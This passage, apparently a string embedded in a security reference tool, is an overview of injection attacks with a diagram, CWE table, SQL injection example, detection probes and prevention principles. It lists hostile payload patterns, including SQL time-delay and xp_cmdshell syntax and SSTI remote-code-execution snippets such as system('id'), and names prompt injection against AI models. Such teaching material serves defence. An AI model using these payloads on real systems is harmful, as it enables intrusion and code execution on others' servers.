FORMS[HTML Forms]\n    USER --> PARAMS[URL Parameters]\n    USER --> HEADERS[HTTP Headers]\n    USER --> COOKIES[Cookies]\n    USER --> JSON[JSON / XML Body]\n    USER --> WSOCK[WebSocket Messages]\n    FORMS & PARAMS & HEADERS & COOKIES & JSON & WSOCK --> APP[Web Application]\n    APP --> SQL[SQL Engine]\n    APP --> NOSQL[NoSQL Engine]\n    APP --> OS[Operating System Shell]\n    APP --> LDAP[LDAP Directory]\n    APP --> XPATH[XPath / XML Parser]\n    APP --> TMPL[Template Engine]\n    APP --> EL[Expression Language]\n    APP --> LLM[LLM / AI Model]\n    SQL --> |SQLi| SQLI[Data theft - Auth bypass - RCE]\n    NOSQL --> |NoSQLi| NOSQLI[Auth bypass - Data exfiltration]\n    OS --> |CMDi| CMDI[RCE - Reverse shell]\n    LDAP --> |LDAPi| LDAPI[Auth bypass - Directory enum]\n    XPATH --> |XPathi| XPATHI[Data extraction - Auth bypass]\n    TMPL --> |SSTI| SSTII[RCE - Config read]\n    EL --> |ELi| ELI[RCE via OGNL - Spring SpEL]\n    LLM --> |Prompt Inj| PROMPTI[Goal hijack - Data exfil]\n```\n\n---\n\n## Attack Types in This Category\n\n| ID | Attack Type | Key CWEs | Subtypes | Severity |\n|----|------------|---------|---------|----------|\n| T01 | SQL Injection | CWE-89 | 12 | CRITICAL |\n| T02 | NoSQL Injection | CWE-943 | 5 | CRITICAL |\n| T03 | OS Command Injection | CWE-78 | 5 | CRITICAL |\n| T04 | SSTI | CWE-94, CWE-1336 | 9 | CRITICAL |\n| T05 | LDAP Injection | CWE-90 | 4 | HIGH |\n| T06 | XPath Injection | CWE-643 | 3 | HIGH |\n| T07 | EL / OGNL Injection | CWE-917 | 5 | CRITICAL |\n| T08 | XML Injection | CWE-91 | 4 | HIGH |\n| T09 | CRLF Injection | CWE-93, CWE-113 | 4 | HIGH |\n| T10 | Code Injection | CWE-94, CWE-95 | 5 | CRITICAL |\n| T11 | ORM Injection | CWE-89 | 4 | HIGH |\n| T12 | JSON Injection | CWE-74 | 4 | MEDIUM |\n| T13 | HTML Injection | CWE-79, CWE-80 | 3 | MEDIUM |\n| T14 | SMTP Injection | CWE-93 | 4 | MEDIUM |\n| T15 | Prompt Injection | CWE-1427 | 6 | HIGH |\n\n---\n\n## Universal Injection Pattern\n\nAll injection attacks share the same structural vulnerability:\n\n```\nVULNERABLE:\nquery = \"SELECT * FROM users WHERE id = \" + userInput\nuserInput = \"1 OR 1=1--\"\nquery = \"SELECT * FROM users WHERE id = 1 OR 1=1--\"  <-- Logic altered\n\nSECURE:\nquery = \"SELECT * FROM users WHERE id = ?\"\nexecute(query, [userInput])\nuserInput is data, never code -- interpreter separation maintained\n```\n\n---\n\n## Detection Heuristics (All Injection Types)\n\n| Probe Type | Payload Pattern | Indicator |\n|-----------|----------------|----------|\n| Error-based | `'`, `\"`, `)`, `` ` `` | Interpreter error in response |\n| Boolean differential | `AND 1=1`, `AND 1=2` | Different response content |\n| Time-based | `SLEEP(5)`, `WAITFOR DELAY` | Delayed response |\n| Out-of-band | DNS/HTTP callback payloads | External request received |\n| Syntax probe | `{{7*7}}`, `${7*7}`, `<%= 7*7 %>` | `49` in response (SSTI/EL) |\n\n---\n\n## Injection by Interpreter\n\n<details>\n<summary><b>SQL -- Database Engines</b></summary>\n\n| Engine | Characteristic Syntax | Time Delay | Comment |\n|--------|----------------------|-----------|--------|\n| MySQL | `SLEEP(N)`, `-- -` | `SLEEP(5)` | `#` comment also works |\n| PostgreSQL | `pg_sleep(N)`, `--` | `pg_sleep(5)` | Stacked queries with `;` |\n| MSSQL | `WAITFOR DELAY`, `--` | `WAITFOR DELAY '0:0:5'` | `xp_cmdshell` for RCE |\n| Oracle | `dbms_pipe.receive_message` | `dbms_pipe.receive_message(('a'),5)` | No stacked queries |\n| SQLite | `randomblob(N)` | `randomblob(500000000)` | Limited OOB options |\n\n</details>\n\n<details>\n<summary><b>SSTI -- Template Engines by Language</b></summary>\n\n| Engine | Language | Probe | RCE Payload Pattern |\n|--------|----------|-------|-------------------|\n| Jinja2 | Python | `{{7*7}}` | `{{''.__class__.__mro__[1].__subclasses__()}}` |\n| Twig | PHP | `{{7*7}}` | `{{_self.env.registerUndefinedFilterCallback('exec')}}` |\n| Freemarker | Java | `${7*7}` | `<#assign ex=\"freemarker.template.utility.Execute\"?new()>` |\n| Velocity | Java | `#set($x=7*7)$x` | Reflection-based RCE |\n| Smarty | PHP | `{php}phpinfo();{/php}` | Direct PHP execution (legacy) |\n| ERB | Ruby | `<%= 7*7 %>` | `<%= system('id') %>` |\n\n</details>\n\n---\n\n## Prevention -- Universal Principles\n\n1. **Parameterized Queries / Prepared Statements** -- for all database interactions\n2. **Contextual Output Encoding** -- HTML, JS, URL, CSS context-aware escaping\n3. **Input Validation** -- allowlist approach for known-good values\n4. **Principle of Least Privilege** -- database accounts with minimal permissions\n5. **WAF as defense-in-depth** -- never as primary control\n6. **ORM safely** -- avoid raw query methods\n7. **Sandboxed template engines** -- no user-controlled template content\n\n---\n\n## References\n\n### Primary Standards\n- [OWASP -- Injection (A05:2025)](https://owasp.org/Top10/2025/A05_2025-Injection/)\n- [OWASP WSTG -- Testing for Injection](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/)\n- [CWE-74: Improper Neutralization](https://cwe.mitre.org/data/definitions/74.html)\n- [CAPEC-152: Inject Unexpected Items](https://capec.mitre.org/data/definitions/152.html)\n\n### Deep Research\n- [PortSwigger -- SQL Injection](https://portswigger.net/web-security/sql-injection)\n- [PortSwigger -- SSTI](https://portswigger.net/research/server-side-template-injection)\n- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)";
